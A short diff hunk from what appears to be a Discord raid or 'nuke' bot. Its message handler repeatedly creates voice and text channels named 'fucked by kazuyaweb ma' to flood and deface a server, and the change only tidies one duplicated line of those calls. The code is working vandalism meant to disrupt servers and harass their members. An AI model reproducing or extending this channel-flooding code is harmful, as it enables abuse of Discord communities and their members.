@@ -149,7 +149,7 @@ client.on('message', message => {
 		message.guild.createChannel('fucked by kazuyaweb ma', 'voice')
 		message.guild.createChannel('fucked by kazuyaweb ma', 'voice')
 		message.guild.createChannel('fucked by kazuyaweb ma', 'voice')
-		message.guild.createChannel('fucked by kazuyaweb ma', 'voice')message.guild.createChannel('fucked by kazuyaweb ma', 'voice')
+		message.guild.createChannel('fucked by kazuyaweb ma', 'voice')
 		message.guild.createChannel('fucked by kazuyaweb ma', 'voice')
 		message.guild.createChannel('fucked by kazuyaweb ma', 'text')
 		message.guild.createChannel('fucked by kazuyaweb ma', 'text')
